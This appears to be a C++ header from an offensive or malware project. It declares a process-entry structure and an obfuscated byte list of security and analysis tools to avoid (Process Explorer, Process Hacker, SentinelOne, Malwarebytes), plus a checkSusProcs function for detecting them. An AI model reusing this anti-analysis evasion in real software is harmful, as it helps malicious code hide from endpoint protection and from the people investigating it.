#pragma once
#include <Windows.h>
#include "dynamicresolution.h"

typedef struct tagPROCESSENTRY32W
{
    DWORD   dwSize;
    DWORD   cntUsage;
    DWORD   th32ProcessID;          // this process
    ULONG_PTR th32DefaultHeapID;
    DWORD   th32ModuleID;           // associated exe
    DWORD   cntThreads;
    DWORD   th32ParentProcessID;    // this process's parent process
    LONG    pcPriClassBase;         // Base priority of process's threads
    DWORD   dwFlags;
    WCHAR   szExeFile[MAX_PATH];    // Path
} PROCESSENTRY32W;
typedef PROCESSENTRY32W* PPROCESSENTRY32W;
typedef PROCESSENTRY32W* LPPROCESSENTRY32W;




// Names separated by 0xF5
// Add names of processes that you may want to avoid here
typedef struct susProcNames {
	std::vector<BYTE> names = { 0x58, 0x56, 0x5b, 0x47, 0x45, 0x50, 0x58, 0x1a, 0x45, 0x50, 0x45, 0xf5, //procexp.exe --> ProcessExplorer
		0x78, 0x56, 0x5b, 0x47, 0x45, 0x57, 0x57, 0x60, 0x49, 0x47, 0x5f, 0x45, 0x56, 0x1a, 0x45, 0x50, 0x45, 0xf5, //ProcessHacker.exe
		0x77, 0x45, 0x5a, 0x54, 0x41, 0x5a, 0x45, 0x5c, 0x69, 0x43, 0x45, 0x5a, 0x54, 0x1a, 0x45, 0x50, 0x45, 0xf5, //SentinelAgent.exe --> SentinelOne
		0x7d, 0x66, 0x67, 0x5c, 0x5b, 0x55, 0x44, 0x65, 0x69, 0x1a, 0x45, 0x50, 0x45, 0xf5, //MBCloudEA.exe --> Malwarebytes
	};
};



int checkSusProcs(PAPI api);
